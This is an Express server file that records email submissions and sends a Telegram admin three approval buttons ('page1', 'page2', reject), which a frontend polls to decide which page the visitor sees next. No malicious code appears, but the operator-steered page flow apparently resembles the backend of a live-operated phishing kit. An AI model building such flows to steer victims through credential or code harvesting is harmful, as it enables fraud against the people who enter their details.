// server.js
require("dotenv").config();

const express = require("express");
const helmet = require("helmet");
const morgan = require("morgan");
const { v4: uuidv4 } = require("uuid");
const { createBot } = require("./bot");

const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
  console.error("❌ Missing BOT_TOKEN or ADMIN_CHAT_ID in .env");
  process.exit(1);
}

// In-memory store: requestId -> { status, createdAt }
const store = new Map();

// Expire requests after 10 minutes to avoid memory growth
const TTL_MS = 10 * 60 * 1000;
setInterval(() => {
  const now = Date.now();
  for (const [id, rec] of store.entries()) {
    if (now - rec.createdAt > TTL_MS) store.delete(id);
  }
}, 60 * 1000);

// Create and launch Telegram bot
const { bot, sendApprovalButtons } = createBot({
  botToken: BOT_TOKEN,
  adminChatId: ADMIN_CHAT_ID,
  store
});

bot.launch().then(() => console.log("✅ Telegram bot launched"));

// Express server
const app = express();
app.use(helmet());
app.use(morgan("dev"));
app.use(express.json({ limit: "32kb" }));

// Serve frontend files from /public
app.use(express.static("public"));

/**
 * POST /api/submit
 * Create a pending approval request and send ONLY 3 buttons to Telegram.
 *
 * Body can be anything you need for your frontend, but DO NOT send passwords here.
 * Example body: { email: "...", username: "...", note: "..." }
 */
app.post("/api/submit", async (req, res) => {
  try {
    // OPTIONAL: minimal validation
    const { email } = req.body || {};
    if (!email || typeof email !== "string") {
      return res.status(400).json({ error: "Missing email" });
    }

    const requestId = uuidv4();

    store.set(requestId, {
      status: "pending",
      createdAt: Date.now()
    });

    // Send Telegram message containing ONLY 3 buttons + requestId
    await sendApprovalButtons(requestId);

    return res.json({ requestId });
  } catch (err) {
    console.error("submit error:", err);
    return res.status(500).json({ error: "Server error" });
  }
});

/**
 * GET /api/status/:id
 * Frontend polls this to know if you approved page1/page2/rejected.
 */
app.get("/api/status/:id", (req, res) => {
  const id = req.params.id;
  const record = store.get(id);

  if (!record) return res.status(404).json({ status: "not_found" });

  return res.json({ status: record.status });
});

// Optional: health check
app.get("/health", (req, res) => {
  res.json({ ok: true });
});

app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
});

// Graceful stop
process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
